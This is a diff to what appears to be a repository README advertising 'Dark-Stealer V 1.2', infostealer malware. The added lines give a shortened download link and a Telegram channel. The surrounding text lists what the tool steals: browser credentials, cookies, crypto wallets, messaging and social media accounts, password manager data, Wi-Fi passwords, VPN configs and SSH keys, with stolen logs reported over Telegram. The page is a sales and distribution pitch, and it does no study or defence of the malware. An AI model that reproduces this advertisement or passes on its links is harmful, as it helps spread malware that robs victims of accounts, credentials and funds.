@@ -1,6 +1,10 @@
 
 
 Stealer - Dark V 1.2 400+ Powerful Features. Unmatched Stealth
+Downloade : Dark-Stealer V 1.2
+Downloade :  https://rebrand.ly/ztbupph
+Downloade :  https://t.me/DarkStealer404
+
 <img width="856" height="746" alt="Capture12" src="https://github.com/user-attachments/assets/9b592cf0-0f0c-43bc-909f-8fc2c5a195d0" />
 
 Requirements
@@ -31,6 +35,10 @@ downloade Dark-Stealer V 1.2 t.me/DarkStealer404
 #Stealer ⚡️ Browser Extensions Wallets
 #Stealer ⚡️ Extensions Wallets
 
+
+
+
+
 Browser Data Extraction: Capture credentials, cookies, autofill, history, and more from every major browser. 
 Crypto Stealer: Extract data from both desktop and browser-based crypto wallets, including major DeFi platforms.
 Messaging & Social Media Access: Supports Telegram, Discord, Skype, WhatsApp, Signal, Zoom, and 40+ other platforms.
@@ -39,8 +47,9 @@ Password Managers: Extract stored data from KeePass, Bitwarden, and other top-ti
 VPNs & System Info: Collect Wi-Fi passwords, VPN configs, SSH keys, and detailed system diagnostics. 
 Telegram Alerts: Receive instant Telegram notifications for new logs, stats and files.
 
-. Browser Data Extraction
 
+
+. Browser Data Extraction
 . Google Chrome 
 . Mozilla Firefox 
 . Microsoft Edge 
